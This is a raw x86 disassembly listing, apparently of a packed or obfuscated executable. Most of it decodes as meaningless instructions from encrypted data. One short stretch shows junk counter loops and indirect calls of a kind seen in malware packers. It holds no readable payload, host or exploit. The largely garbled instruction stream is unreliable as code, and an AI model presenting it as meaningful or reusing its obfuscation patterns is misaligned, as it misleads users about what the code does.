  413ea6:	add    esp,DWORD PTR [ebx+esi*1-0x4fa24713]
  413ead:	cdq    
  413eae:	pop    ebx
  413eaf:	and    bh,cl
  413eb1:	data16 ja 0x413ed2
  413eb4:	out    0x29,al
  413eb6:	nop
  413eb7:	xor    cl,bh
  413eb9:	nop
  413eba:	in     eax,0xdb
  413ebc:	sub    ecx,DWORD PTR [ecx+0x62]
  413ebf:	mov    dl,0x84
  413ec2:	pop    ebx
  413ec3:	addr16 ss in eax,dx
  413ec6:	mov    eax,ds:0x3d82c955
  413ecb:	hlt    
  413ecc:	pusha  
  413ecd:	adc    DWORD PTR [ecx],0x5f79ca0
  413ed3:	mov    ds:0xdf1cae3,al
  413ed8:	or     esi,DWORD PTR ds:0xcbd08302
  413ede:	jg     0x413e9f
  413ee0:	call   0x779a:0xe021de9b
  413ee7:	mov    bh,0xff
  413ee9:	out    dx,al
  413eea:	shl    DWORD PTR [eax-0x30],1
  413eed:	mov    eax,ds:0xdad3c73d
  413ef2:	inc    edi
  413ef3:	(bad)  
  413ef4:	scas   al,BYTE PTR es:[edi]
  413ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ef6:	xor    DWORD PTR [ebx],esi
  413ef8:	cdq    
  413ef9:	jbe    0x413f36
  413efb:	int3   
  413efc:	or     DWORD PTR [esi+0x7fabaaab],edi
  413f02:	adc    dl,BYTE PTR [ebx-0x35ccfe12]
  413f08:	sbb    al,0x82
  413f0a:	int    0xa2
  413f0c:	jnp    0x413f61
  413f0e:	xchg   esi,eax
  413f0f:	mov    ecx,0x59b09fe8
  413f14:	xor    BYTE PTR [edx],0xc1
  413f17:	sub    BYTE PTR [eax+eax*2-0x6de5cafa],ch
  413f1e:	adc    esi,esi
  413f20:	aad    0x58
  413f22:	das    
  413f23:	sbb    ebp,esp
  413f25:	sbb    al,bl
  413f27:	fld    TBYTE PTR [esp+eax*1+0x55ace3aa]
  413f2e:	(bad)  
  413f2f:	pop    eax
  413f30:	ficom  DWORD PTR [ecx]
  413f32:	adc    ah,dh
  413f34:	add    eax,DWORD PTR [ecx]
  413f36:	mov    bh,0x8c
  413f38:	hlt    
  413f39:	ror    BYTE PTR [esi],cl
  413f3b:	add    al,0x78
  413f3d:	nop
  413f3e:	ror    BYTE PTR [edx+0x6a8ef2b3],1
  413f44:	sbb    ah,BYTE PTR [ebp-0x7e09da77]
  413f4a:	fild   WORD PTR [esi-0x4b7842e4]
  413f50:	repnz arpl WORD PTR [ecx-0x8],bx
  413f54:	pop    esp
  413f55:	pop    ebx
  413f56:	std    
  413f57:	fsubr  DWORD PTR [eax-0x22]
  413f5a:	jge    0x413fa4
  413f5c:	test   ebp,0xe462917
  413f62:	mov    cl,0xf1
  413f64:	cmp    edx,ecx
  413f66:	data16 das 
  413f68:	imul   ecx,DWORD PTR [ebp-0xa],0x1293f015
  413f6f:	sbb    BYTE PTR [ecx],dh
  413f71:	in     eax,dx
  413f72:	out    dx,al
  413f73:	mov    al,0xc2
  413f75:	dec    esp
  413f76:	jmp    0x413f5c
  413f78:	rol    DWORD PTR [edx+0x51546595],1
  413f7e:	in     al,0x97
  413f80:	leave  
  413f81:	push   esp
  413f82:	cmp    BYTE PTR [eax+0x3f41ab0d],dh
  413f88:	inc    ecx
  413f89:	xor    edi,eax
  413f8b:	jnp    0x413f38
  413f8d:	outs   dx,BYTE PTR ds:[esi]
  413f8e:	sub    esp,esi
  413f90:	push   0x1f
  413f92:	stos   DWORD PTR es:[edi],eax
  413f93:	add    BYTE PTR [ebx+ebp*2-0x5f4903b],0xa8
  413f9b:	push   ecx
  413f9c:	mov    eax,ds:0xe0db04bc
  413fa1:	in     al,dx
  413fa2:	dec    edi
  413fa3:	ss sbb BYTE PTR ss:[ebp-0x78],dl
  413fa8:	nop
  413fa9:	push   edx
  413faa:	cld    
  413fab:	inc    esi
  413fac:	mov    ecx,0xe1d99806
  413fb1:	pop    ebp
  413fb2:	or     DWORD PTR [esi+0x4b68d65b],0xffffffa1
  413fb9:	stos   BYTE PTR es:[edi],al
  413fba:	call   0x9a9e:0x8c72cc23
  413fc1:	cs adc eax,0x952dbc02
  413fc7:	lea    edi,[edx-0xc31ac85]
  413fcd:	or     al,0xaf
  413fcf:	clc    
  413fd0:	out    dx,al
  413fd1:	loope  0x414025
  413fd3:	and    eax,0x28108562
  413fd8:	dec    esi
  413fd9:	sbb    DWORD PTR [ecx+0x9267175],edi
  413fdf:	ficomp WORD PTR [ebx-0x4a]
  413fe2:	and    bl,ah
  413fe4:	leave  
  413fe5:	pop    es
  413fe6:	setge  BYTE PTR [esi+0x12b6f72a]
  413fed:	pop    eax
  413fee:	sub    al,0x60
  413ff0:	and    ah,BYTE PTR [esi]
  413ff2:	mov    cl,0x19
  413ff4:	pop    esp
  413ff5:	(bad)
  413ff8:	lods   al,BYTE PTR ds:[esi]
  413ff9:	xor    al,0x4a
  413ffb:	jno    0x413fff
  413ffd:	std    
  413ffe:	jmp    0xe32d:0x30c4f552
  414005:	in     al,0x93
  414007:	sar    esi,1
  414009:	add    al,0x81
  41400b:	cs aad 0xf9
  41400e:	xchg   edx,eax
  41400f:	stc    
  414010:	int    0x85
  414012:	jbe    0x414019
  414014:	es sahf 
  414016:	xor    cl,BYTE PTR [esi-0x22c92ca5]
  41401c:	scas   al,BYTE PTR es:[edi]
  41401d:	sub    al,0xdf
  41401f:	mov    cl,0x55
  414021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414022:	(bad)  
  414023:	mov    ah,0xbb
  414025:	dec    esp
  414026:	or     ch,ah
  414028:	mov    esp,0xb5ffeef3
  41402d:	mov    ah,BYTE PTR [eax+0x33]
  414030:	xlat   BYTE PTR ds:[ebx]
  414031:	and    esp,DWORD PTR [ebx+0x24]
  414034:	shl    DWORD PTR [ebp+eax*8+0x4480b827],1
  41403b:	retf   
  41403c:	pop    ebx
  41403d:	ja     0x414085
  41403f:	or     al,0xa
  414041:	mov    BYTE PTR [edx],al
  414043:	loope  0x414027
  414045:	cld    
  414046:	jo     0x414087
  414048:	(bad)  
  414049:	(bad)  
  41404a:	xor    ebx,esi
  41404c:	add    eax,0x808a6e10
  414051:	adc    DWORD PTR [ecx],esp
  414053:	sbb    dl,BYTE PTR [eax]
  414055:	ja     0x4140bf
  414057:	sub    BYTE PTR [ecx],cl
  414059:	mov    ds:0xaf2a5d29,eax
  41405e:	mov    ecx,0xee76abb3
  414063:	xor    al,0xc8
  414065:	dec    esp
  414066:	pusha  
  414067:	repz fs sbb edx,0xffffffa9
  41406c:	test   al,0x33
  41406e:	sbb    eax,0xd7135947
  414073:	pop    ss
  414074:	test   al,0xb3
  414076:	and    bh,BYTE PTR [esi+0x50c3b59]
  41407c:	cmc    
  41407d:	dec    ebp
  41407e:	or     esi,DWORD PTR [ebx+0x62]
  414081:	push   ds
  414082:	xchg   esp,eax
  414083:	aad    0x43
  414085:	out    dx,eax
  414086:	mov    ebx,0x68941ed9
  41408b:	rcl    BYTE PTR [eax+0x519b9443],cl
  414091:	push   edi
  414092:	mov    cl,0x1e
  414094:	cmp    dh,bl
  414096:	jo     0x414087
  414098:	and    DWORD PTR [esi],0x32aab6c7
  41409e:	or     eax,0x8e8e3721
  4140a3:	jmp    0xbd31bc14
  4140a8:	push   edi
  4140a9:	push   esp
  4140aa:	aad    0xe
  4140ac:	fidivr WORD PTR es:[edi-0x32825426]
  4140b3:	shr    bl,1
  4140b5:	jge    0x414092
  4140b7:	addr16 in eax,dx
  4140b9:	mov    al,ds:0xe91aa6e1
  4140be:	sub    dl,BYTE PTR [esi-0x49]
  4140c1:	lahf   
  4140c2:	inc    edx
  4140c3:	xchg   ecx,eax
  4140c4:	cmp    BYTE PTR [ebp-0x612aff65],cl
  4140ca:	sub    cl,BYTE PTR [edx-0x15]
  4140cd:	add    esp,ecx
  4140cf:	in     al,dx
  4140d0:	xchg   edx,eax
  4140d1:	cmp    dh,BYTE PTR [esi+0x2d4b037f]
  4140d7:	or     eax,0x50bb1d0b
  4140dc:	pop    ds
  4140dd:	pop    esi
  4140de:	lods   al,BYTE PTR ds:[esi]
  4140df:	aaa    
  4140e0:	pop    ds
  4140e1:	into   
  4140e2:	ret    
  4140e3:	ret    0x2f26
  4140e6:	xchg   ebx,eax
  4140e7:	lahf   
  4140e8:	loopne 0x4140ae
  4140ea:	test   eax,0xe3f9e35e
  4140ef:	js     0x414122
  4140f1:	das    
  4140f2:	add    DWORD PTR [eax-0x50a0b364],edx
  4140f8:	push   ebx
  4140f9:	jmp    0xe9fc:0x74f408c8
  414100:	ins    DWORD PTR es:[edi],dx
  414101:	xor    ebx,DWORD PTR [ecx]
  414103:	mov    cl,0xbf
  414105:	or     DWORD PTR [ebx-0x38],ebp
  414108:	(bad)  
  414109:	or     DWORD PTR ss:[ebx],0xffffffde
  41410d:	push   esp
  41410f:	mov    ds:0xb92daf22,al
  414114:	or     al,0xf1
  414116:	dec    esp
  414117:	push   0x7998c259
  41411c:	stos   BYTE PTR es:[edi],al
  41411d:	pushf  
  41411e:	call   0xe71343ec
  414123:	or     BYTE PTR [edx],al
  414125:	push   ecx
  414126:	bnd je 0x414145
  414129:	or     eax,0xb38601e9
  41412e:	push   ebx
  41412f:	int    0x53
  414131:	pop    edx
  414132:	in     al,0xf8
  414134:	bound  ebx,QWORD PTR [edx]
  414136:	pop    edx
  414137:	sub    eax,0xc600273b
  41413c:	mov    bl,BYTE PTR [ebx-0x11]
  41413f:	xchg   DWORD PTR ds:0x64c479d6,ebp
  414145:	(bad)  
  414146:	repnz mov ebp,0x4856b64f
  41414c:	and    al,0x65
  41414e:	retf   
  41414f:	rcr    BYTE PTR [esi-0x35],1
  414152:	adc    al,0xa5
  414154:	in     eax,dx
  414155:	ret    0xa5ee
  414158:	pop    ss
  414159:	mov    ebx,0xb43001a9
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fd55,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fd55
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fd55,ecx
  414178:	cmp    DWORD PTR ds:0x42fd55,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e5ef
  41418b:	cmp    DWORD PTR ds:0x42fd55,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fd59,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e77f
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fd69
  4141ba:	sbb    DWORD PTR ds:0x42fd55,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd85,0x42e793
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e76b,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd85,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e78f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fd5d,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fd5d
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fd5d,ecx
  41420f:	cmp    DWORD PTR ds:0x42fd5d,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e5f3
  41423b:	cmp    DWORD PTR ds:0x42fd5d,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fd5d
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fd5d,ecx
  414257:	cmp    DWORD PTR ds:0x42fd5d,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414257
  414283:	jbe    0x414284
  414285:	retf   0x7380
  414288:	jo     0x4142fa
  41428a:	mov    ecx,0x3070707e
  41428f:	rcl    BYTE PTR ds:0xc10df172,1
  414295:	sbb    edi,DWORD PTR [eax+0x19]
  414298:	shl    BYTE PTR ds:0x6d06682c,0x40
  41429f:	pusha  
  4142a0:	add    BYTE PTR [ebp-0x34],dl
  4142a3:	enter  0x6482,0xf8
  4142a7:	call   0xfa3e:0xe891d461
  4142ae:	pop    edi
  4142af:	xchg   ecx,eax
  4142b0:	out    dx,eax
  4142b1:	pop    eax
  4142b2:	and    DWORD PTR [esi-0x1b150c10],ecx
  4142b8:	cs cld 
  4142ba:	out    dx,al
  4142bb:	mov    dh,0x79
  4142bd:	jmp    0xbf8d1198
  4142c2:	imul   ebx,DWORD PTR [ebx+eiz*1-0x1ab46e67],0xffffffe6
  4142ca:	cmp    edx,DWORD PTR [ebx-0x7514293a]
  4142d0:	push   ebp
  4142d1:	jne    0x4142fa
  4142d3:	dec    edx
  4142d4:	xor    bl,BYTE PTR [ebx+0x9f10afa]
  4142da:	mov    ?,WORD PTR [ebx+0x23]
  4142dd:	arpl   WORD PTR [ecx],bp
  4142df:	ret    
  4142e0:	mov    ecx,0x647bc253
  4142e5:	push   ebx
  4142e6:	sti    
  4142e7:	stos   DWORD PTR es:[edi],eax
  4142e8:	and    eax,0x64128ec3
  4142ed:	sbb    al,0x59
  4142ef:	inc    edi
  4142f0:	pop    bp
  4142f2:	and    BYTE PTR [ebp+0x7f],bh
  4142f5:	mov    dl,0x4c
  4142f7:	(bad)  
  4142f8:	es jmp 0xa1bd568a
  4142fe:	xor    al,0x4e
  414300:	call   0xb93f192b
  414305:	fld    QWORD PTR [ecx+0x30]
  414308:	sahf   
  414309:	mov    ecx,0x1cf8805a
  41430e:	inc    edi
  41430f:	out    0x5c,al
  414311:	adc    eax,edi
  414313:	pop    es
  414314:	dec    esi
  414315:	rcl    DWORD PTR [esi],cl
  414317:	sub    al,0xb
  414319:	xchg   esi,eax
  41431a:	stos   BYTE PTR es:[edi],al
  41431b:	push   esp
  41431c:	ja     0x414389
  41431e:	out    0x24,al
  414320:	ins    DWORD PTR es:[edi],dx
  414321:	sti    
  414322:	fstp   QWORD PTR ds:0x5f24e135
  414328:	mov    cs,WORD PTR [ebx+esi*1-0x184e89f4]
  41432f:	lea    esi,[ebp-0x30115b3d]
  414335:	push   ss
  414336:	imul   edx,DWORD PTR [esi-0x13],0xffffffb1
  41433a:	sub    ch,BYTE PTR [ebx]
  41433c:	call   0xd056:0x4aedd5ba
  414343:	call   0xf5f5:0x4ecd2a8a
  41434a:	retf   
  41434b:	ss test al,0x55
  41434e:	shl    DWORD PTR [ebx-0xed10a34],1
  414354:	outs   dx,BYTE PTR ds:[esi]
  414355:	mov    edx,0x7389a4f1
  41435a:	inc    edi
  41435b:	in     al,dx
  41435c:	mov    BYTE PTR [ebp-0x72c5b378],0x4f
  414363:	ficom  WORD PTR es:[eax]
  414366:	mov    ds:0xf05abe55,al
  41436b:	out    0x19,eax
  41436d:	retf   0x8dd5
  414370:	cmp    eax,ebx
  414372:	sti    
  414373:	fistp  WORD PTR [esi-0x3f]
  414376:	add    DWORD PTR [esi],edi
  414378:	sub    dh,BYTE PTR [ecx+0x39]
  41437b:	(bad)  
  41437c:	jns    0x414349
  41437e:	fnsave fs:[esi+eiz*2-0x1e0a2663]
  414386:	int    0xb4
  414388:	fcmovne st,st(5)
  41438a:	mov    ch,0x3c
  41438c:	xor    BYTE PTR [edi],0xcb
  41438f:	into   
  414390:	push   0xa381e695
  414395:	std    
  414396:	push   ebp
  414397:	das    
  414398:	shl    BYTE PTR [eax+0x19],1
  41439b:	ins    DWORD PTR es:[edi],dx
  41439c:	mov    esp,0x320c033d
  4143a1:	sub    eax,0x23cb98ed
  4143a6:	jbe    0x41435d
  4143a8:	lds    edx,FWORD PTR [ecx]
  4143aa:	mov    ds:0xdb092e9b,al
  4143af:	imul   edi,ebx,0x39c24666
  4143b5:	mov    dl,0xdc
  4143b7:	icebp  
  4143b8:	xor    dh,BYTE PTR [ecx+edi*2+0xfd056ab]
  4143bf:	retf   0x7363
  4143c2:	jbe    0x414366
  4143c4:	fisttp WORD PTR [edx]
  4143c6:	scas   al,BYTE PTR es:[edi]
  4143c7:	mov    dl,0xfa
  4143c9:	out    0x65,eax
  4143cb:	mov    al,ds:0xccd49611
  4143d0:	into   
  4143d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143d2:	ss mov ebx,0x222fda67
  4143d8:	pop    edx
  4143d9:	hlt    
  4143da:	call   0x5b0f65fe
  4143df:	lods   al,BYTE PTR ds:[esi]
  4143e0:	dec    esp
  4143e1:	sbb    eax,0x2eddeab5
  4143e6:	ja     0x4143b3
  4143e8:	inc    esp
  4143e9:	lahf   
  4143ea:	ror    DWORD PTR [eax+eax*8+0x3f00d350],cl
  4143f1:	and    DWORD PTR [edi+eiz*8+0x4d907db6],ecx
  4143f8:	xchg   edi,eax
  4143f9:	mov    dl,0x18
  4143fc:	and    edi,DWORD PTR ds:0x83942e85
  414402:	and    DWORD PTR [ebx-0x450bb82e],edi
  414408:	jno    0x414390
  41440a:	dec    edx
  41440b:	aad    0x96
  41440d:	stc    
  41440e:	test   DWORD PTR [ebx+0x18],esi
  414411:	xor    al,0x37
  414413:	loope  0x4143e7
  414415:	xor    eax,0x9bbe9cb1
  41441a:	aaa    
  41441b:	mov    edi,0xe0ec7bb0
  414420:	mov    dh,ah
  414422:	ds adc ch,bl
  414425:	dec    ebx
  414426:	stc    
  414427:	sbb    eax,0x57aa236e
  41442c:	sar    DWORD PTR [esi],0x6c
  41442f:	mov    esp,0xd6f529b6
  414434:	cmp    BYTE PTR ds:0x6b332e06,al
  41443a:	ja     0x41442d
  41443c:	add    DWORD PTR [eax+0x45dc9b55],esi
  414442:	adc    ah,ah
  414444:	sub    edi,0xffffffaa
  414447:	(bad)  
  414448:	lods   al,BYTE PTR ds:[esi]
  414449:	repnz ins BYTE PTR es:[edi],dx
  41444b:	call   0x34fb998
  414450:	xchg   ebp,ebp
  414452:	sbb    eax,0x131b1cec
  414457:	bound  edx,QWORD PTR [esi+0x72]
  41445a:	call   0x3f2e142d
  41445f:	dec    edi
  414460:	test   DWORD PTR [ebp-0x7d],ebp
  414463:	mov    ch,0xbd
  414465:	mov    esp,0xc82957e6
  41446a:	mov    bl,0xb8
  41446c:	push   esp
  41446d:	adc    BYTE PTR [edi-0x31635aa0],al
  414473:	inc    edx
  414474:	mov    BYTE PTR [ebp+edi*8+0x616209ec],cl
  41447b:	sub    al,0x9b
  41447d:	(bad)  
  41447e:	jmp    0x4144f7
  414480:	add    BYTE PTR [ecx+0xc],0x2f
  414484:	jecxz  0x414501
  414486:	repz xchg ecx,eax
  414488:	xchg   ecx,eax
  414489:	cli    
  41448a:	fst    DWORD PTR [ecx+esi*1]
  41448d:	imul   eax,eax,0xffffffb8
  414490:	mov    al,ds:0x9d190e16
  414495:	mov    BYTE PTR [ebp+0x117ff904],ch
  41449b:	repz stc 
  41449d:	les    ecx,FWORD PTR [ebp+esi*1-0x52]
  4144a1:	(bad)  
  4144a2:	das    
  4144a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a4:	mov    esi,0xeed6fa6c
  4144a9:	scas   eax,DWORD PTR es:[edi]
  4144aa:	xchg   esi,eax
  4144ab:	inc    esi
  4144ac:	fdivr  QWORD PTR [ebx+0x58f94f25]
  4144b2:	call   0x72b6614e
  4144b7:	push   0x8
  4144b9:	in     eax,dx
  4144ba:	add    ah,BYTE PTR [ecx+0x47]
  4144bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144be:	and    dh,bh
  4144c0:	and    al,BYTE PTR [eax+0x2b512b70]
  4144c6:	xor    bl,BYTE PTR [edx-0xdd2474f]
  4144cc:	xchg   DWORD PTR [ebx],edx
  4144ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144cf:	sub    al,0xb2
  4144d1:	test   BYTE PTR [edx-0x4a28879c],0xff
  4144d8:	jecxz  0x4144c5
  4144da:	aad    0xbf
  4144dc:	mov    ds:0xf4ac5a9d,eax
  4144e1:	mov    BYTE PTR [ebx+ecx*4+0x7e43a251],dl
  4144e8:	add    ebp,DWORD PTR [ecx+0x6e85f0d4]
  4144ee:	add    ecx,DWORD PTR [esi-0x55]
  4144f1:	popa   
  4144f2:	push   cs
  4144f3:	sar    eax,cl
  4144f5:	repz clc 
  4144f7:	test   DWORD PTR [ecx],edx
  4144f9:	ins    DWORD PTR es:[edi],dx
  4144fa:	pop    ebp
  4144fb:	push   es
  4144fc:	lods   al,BYTE PTR ds:[esi]
  4144fd:	xor    BYTE PTR [ebp-0x4672fc0b],cl
  414503:	pusha  
  414504:	mov    ch,0x46
  414506:	call   0xd3a5b69d
  41450b:	repz jg 0x41454d
  41450e:	and    ecx,DWORD PTR [eax+ebp*4]
  414511:	mov    dl,0x61
  414513:	jle    0x4144fb
  414515:	xchg   ebx,eax
  414516:	daa    
  414517:	mov    dh,BYTE PTR [esi+eax*8-0x69]
  41451b:	dec    eax
  41451c:	add    DWORD PTR [edx+0x7ee69e47],0x77d35ee2
  414526:	push   es
  414527:	pop    edi
  414528:	test   BYTE PTR [edi-0x75],ah
  41452b:	xchg   edx,eax
  41452c:	or     DWORD PTR cs:[ebx+ebp*8-0xdaf4cbd],esi
  414534:	out    dx,eax
  414535:	push   ebx
  414536:	jl     0x4145a9
  414538:	jl     0x414539
  41453a:	popa   
  41453b:	cwde   
  41453c:	fwait
  41453d:	hlt    
  41453e:	jae    0x4145b0
  414540:	in     al,0x4a
  414542:	in     eax,dx
  414543:	add    dl,bh
  414545:	jmp    0x41454c
  414547:	add    al,0x16
  414549:	dec    ax
  41454b:	int    0x2a
  41454d:	mov    ebp,0x862e990b
  414552:	leave  
  414553:	pop    edi
  414554:	or     eax,0xffd075ff
  414559:	jne    0x414567
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xba6fbeb4
  414576:	inc    ebx
  414577:	pop    ss
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x414576
  414581:	mov    ds:0x70da2603,al
  414586:	pop    es
  414587:	cmp    cl,BYTE PTR [ecx+0x53bce333]
  41458d:	mov    al,ds:0xa266a956
  414592:	mov    eax,ds:0xf66da423
  414597:	or     eax,0x6b556388
  41459c:	stos   DWORD PTR es:[edi],eax
  41459d:	retf   
  41459e:	sbb    al,BYTE PTR [ebx+esi*1+0x5a]
  4145a2:	addr16 je 0x414555
  4145a5:	xchg   esi,eax
  4145a6:	sub    BYTE PTR [edx-0x64],dh
  4145a9:	inc    esi
  4145aa:	dec    edx
  4145ab:	and    ah,BYTE PTR [eax+ebp*8-0x75]
  4145af:	cli    
  4145b0:	or     eax,DWORD PTR [ecx-0x46]
  4145b3:	mov    ds:0xb9df89a9,al
  4145b8:	int    0x57
  4145ba:	push   0xffffff95
  4145bc:	pop    ebp
  4145bd:	fwait
  4145be:	pop    edi
  4145bf:	cmp    DWORD PTR [esp+ecx*2],ecx
  4145c2:	pop    ebp
  4145c3:	retf   
  4145c4:	xchg   ebp,eax
  4145c5:	cmp    eax,0x383f6e8
  4145ca:	inc    esp
  4145cb:	and    edx,esi
  4145cd:	mov    esi,0xd64ec159
  4145d2:	push   ebx
  4145d3:	pop    ds
  4145d4:	sahf   
  4145d5:	fwait
  4145d6:	fwait
  4145d7:	sahf   
  4145d8:	fiadd  DWORD PTR [edx+0x2b2be617]
  4145de:	mov    esp,0xcc035249
  4145e3:	test   eax,0x566ea036
  4145e8:	mov    fs,ecx
  4145ea:	inc    edi
  4145eb:	lea    esi,[esp+edi*1]
  4145ee:	dec    edi
  4145ef:	sub    eax,0xac549338
  4145f4:	adc    DWORD PTR [ebx-0x66ca3397],esp
  4145fa:	rol    ebp,0xca
  4145fd:	mov    dh,0xf6
  4145ff:	rcl    bh,cl
  414601:	inc    esp
  414602:	aas    
  414603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414604:	jecxz  0x414602
  414606:	stos   DWORD PTR es:[edi],eax
  414607:	pop    ebx
  414608:	push   eax
  414609:	shl    DWORD PTR [ecx-0x55],0x93
  41460d:	xor    eax,0x40c9d9a9
  414612:	and    ebp,ecx
  414614:	lods   eax,DWORD PTR ds:[esi]
  414615:	mov    esi,0xd9259180
  41461a:	outs   dx,DWORD PTR ds:[esi]
  41461b:	and    eax,0xa14a52d8
  414620:	add    DWORD PTR [edi],eax
  414622:	sub    dl,BYTE PTR [eax]
  414624:	aaa    
  414625:	rcl    DWORD PTR [eax-0x1218ec1d],0xe3
  41462c:	das    
  41462d:	data16 mov ?,WORD PTR [edi+edx*4]
  414631:	add    ecx,eax
  414633:	popa   
  414634:	xor    ebp,edx
  414636:	mov    ds:0x74429d0a,eax
  41463b:	sbb    edx,0xffffff92
  41463e:	dec    ecx
  41463f:	pop    edx
  414640:	mov    BYTE PTR [ebp+0x379d505e],dl
  414646:	or     bl,BYTE PTR [edx-0x1f91c5cd]
  41464c:	pop    ss
  41464d:	aad    0xe3
  41464f:	dec    edx
  414650:	ins    DWORD PTR es:[edi],dx
  414651:	nop
  414652:	test   eax,0xc43eb481
  414657:	clc    
  414658:	in     al,dx
  414659:	rcl    DWORD PTR [edx],0x7c
  41465c:	fdivr  DWORD PTR [edi+0x2e4aeba9]
  414662:	push   esp
  414663:	fist   WORD PTR [edx+0x4f]
  414666:	retf   
  414667:	rcr    DWORD PTR [ecx-0x65],1
  41466a:	in     eax,0x29
  41466c:	add    esp,DWORD PTR [eax+0x28]
  41466f:	xor    BYTE PTR [ebp-0x6813b675],dl
  414675:	cld    
  414676:	clts   
  414678:	mov    ds:0x49b7f399,al
  41467d:	jle    0x41464c
  41467f:	imul   ebx,DWORD PTR [ebp-0x1e],0xffffff8f
  414683:	mov    fs,WORD PTR [eax-0x68a11ca1]
  414689:	pop    eax
  41468a:	push   edx
  41468b:	mov    ds:0xb51aa9b7,eax
  414690:	sub    al,0x20
  414692:	loopne 0x41462a
  414694:	rcl    DWORD PTR [eax-0x3fb7076d],cl
  41469a:	fcom   DWORD PTR [ecx]
  41469c:	jb     0x4146b8
  41469e:	pop    es
  41469f:	call   DWORD PTR [eax]
  4146a1:	pop    eax
  4146a2:	sbb    DWORD PTR [ebp+ebp*8+0x83c0539],esp
  4146a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146aa:	jb     0x414706
  4146ac:	int3   
  4146ad:	loopne 0x4146f8
  4146af:	mov    al,0xa8
  4146b1:	icebp  
  4146b2:	outs   dx,DWORD PTR ds:[esi]
  4146b3:	dec    esp
  4146b4:	repnz or al,BYTE PTR [ecx+0x48a194eb]
  4146bb:	test   BYTE PTR [edx+0x4469febf],cl
  4146c1:	or     eax,0x801430ce
  4146c6:	xor    ebx,eax
  4146c8:	dec    ebx
  4146c9:	mov    eax,ds:0x4cdf3fb2
  4146ce:	arpl   WORD PTR [ebp-0x2e],di
  4146d1:	jae    0x4146b2
  4146d3:	push   ecx
  4146d4:	lods   eax,DWORD PTR ds:[esi]
  4146d5:	in     eax,0x47
  4146d7:	push   ss
  4146d8:	test   BYTE PTR [ebx-0x8],al
  4146db:	adc    DWORD PTR [eax],ebp
  4146dd:	cmp    BYTE PTR [ebx+0x1a],bl
  4146e0:	jge    0x414738
  4146e2:	in     al,dx
  4146e3:	pop    ebx
  4146e4:	sbb    cl,BYTE PTR [eax-0x3c323dd9]
  4146ea:	fcomp  QWORD PTR [ebx+edi*4+0x2]
  4146ee:	outs   dx,DWORD PTR ds:[esi]
  4146ef:	loope  0x4146ca
  4146f1:	dec    ebx
  4146f2:	imul   ebx,DWORD PTR ds:0x4048498a,0x19
  4146f9:	sub    ebp,DWORD PTR [ecx]
  4146fb:	pop    eax
  4146fc:	aas    
  4146fd:	pop    eax
  4146fe:	icebp  
  4146ff:	sbb    dh,BYTE PTR [edi+0x40]
  414702:	sbb    ebx,esi
  414704:	icebp  
  414705:	adc    ebx,DWORD PTR [edx+0x58b20eaa]
  41470b:	pop    ebx
  41470c:	jb     0x41471a
  41470e:	jno    0x414789
  414710:	sahf   
  414711:	ror    DWORD PTR [eax],cl
  414713:	lods   eax,DWORD PTR ds:[esi]
  414714:	inc    ebx
  414715:	adc    eax,edi
  414717:	in     eax,0xf6
